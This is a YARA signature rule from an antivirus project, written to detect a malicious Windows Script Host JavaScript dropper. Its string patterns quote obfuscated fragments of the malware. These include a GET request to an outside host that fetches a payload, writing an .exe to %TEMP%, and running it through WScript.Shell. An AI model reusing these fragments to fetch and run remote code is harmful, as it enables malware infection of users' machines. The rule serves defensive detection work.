rule sig_20160328_c8efcbfe55159c70059b05856326295a {
  meta:
    description = "datamaliciousorder - file 20160328_c8efcbfe55159c70059b05856326295a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "80464b58f44908b47119079eefded6ee34e64d21a3a7dc9fe4c49dd5971cd32b"

  strings:
    $s1  = "function Vkpxb() {return Awjvjeffw[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"0nHhYDdEllo.exe\";};" fullword ascii
    $s2  = "Uuexmh[Muiqmgpv](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Bxzkqg](Kidfh() * 11)} while (Uuexmh[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Awjvjeffw = function Rngslqxef() {return WScript[Sndzoya](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ibuxeqp(Fctkomvfdj, Vwrmd){return Fctkomvfdj - Vwrmd;};" fullword ascii
    $s6  = "function Ymwmfqpmzd() {return ((Wydzvvgv == true) && (Wydzvvgv == Evesymdv)) ? 1 : Fbzggxfwg;};" fullword ascii
    $s7  = "function Hinndsc(Bezvyihh){Awjvjeffw[\"Run\"](Bezvyihh, Fbzggxfwg, Fbzggxfwg);};" fullword ascii
    $s8  = "Wydzvvgv = true; " fullword ascii
    $s9  = "var Tyiufl = false;" fullword ascii
    $s10 = "function Lkechaimu(Kogfvkmdrs) {var Rddgrvsj = (1, 2, 3, 4, 5, Kogfvkmdrs); return Rddgrvsj;};" fullword ascii
    $s11 = "function Jdels(){return Ftiglf;};" fullword ascii
    $s12 = "return Ibuxeqp(Nhftvedr, Xyjcdvrq);" fullword ascii
    $s13 = "var Wydzvvgv = false;" fullword ascii
    $s14 = " while (Czvubsvpgl){" fullword ascii
    $s15 = "function Pqoqgrn(){return Sndzoya;};" fullword ascii
    $s16 = "var Evesymdv = false;" fullword ascii
    $s17 = "function Gxwkticxj()" fullword ascii
    $s18 = "Evesymdv = true; " fullword ascii
    $s19 = "function Kidfh(){return 22;};" fullword ascii
    $s20 = "var Yjxipvyde = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}